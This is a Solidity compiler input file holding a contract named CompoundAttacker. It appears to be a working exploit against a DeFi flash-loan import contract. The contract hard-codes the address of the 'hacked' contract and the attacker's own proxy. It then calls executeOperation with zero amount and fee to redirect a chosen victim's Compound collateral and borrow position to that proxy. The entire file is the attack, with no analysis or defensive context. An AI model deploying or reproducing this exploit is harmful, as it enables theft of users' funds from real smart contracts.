{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":true,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"browser/CompoundAttacker.sol":{"content":"pragma solidity ^0.6.0;\n\nabstract contract CompoundImportFlasLoan {\n    function executeOperation(\n        address _reserve,\n        uint256 _amount,\n        uint256 _fee,\n        bytes calldata _params)\n    external virtual;\n}\n\ncontract CompoundAttacker {\n    \n    address public constant HACKED_CONTRACT = 0x0a9238e14d5A20CDb03811B12D1984587C3CE9a0;\n    \n    address public constant OUR_PROXY = 0xe20AA1584Df34B8be8D544A9Ae15eB49807d5D93;\n    \n    function withdrawFunds(address _vicitm, address _tokenAddr, address _cCollateralToken, address _cBorrowToken) public {\n        // address cCollateralToken,\n        //     address cBorrowToken,\n        //     address user,\n        //     address proxy\n        \n        bytes memory paramData = abi.encode(_cCollateralToken, _cBorrowToken, _vicitm, OUR_PROXY);\n        \n        CompoundImportFlasLoan(HACKED_CONTRACT).executeOperation(\n            _tokenAddr,\n            0,\n            0,\n            paramData\n        );\n    }\n}"}}}